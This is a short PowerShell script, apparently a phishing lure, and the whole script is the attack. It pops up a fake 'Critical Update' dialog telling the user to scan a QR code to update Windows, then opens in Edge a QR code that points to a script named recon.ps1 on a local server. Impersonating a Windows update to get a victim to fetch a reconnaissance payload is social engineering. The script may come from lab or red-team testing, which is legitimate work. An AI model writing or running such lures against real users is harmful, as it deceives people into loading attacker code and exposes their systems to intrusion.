Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("Scan this QR to update Windows now", "Critical Update")
$url = "http://127.0.0.1:8000/recon.ps1"
$qr = "https://api.qrserver.com/v1/create-qr-code/?data=$url"
Start-Process "msedge.exe" -ArgumentList $qr
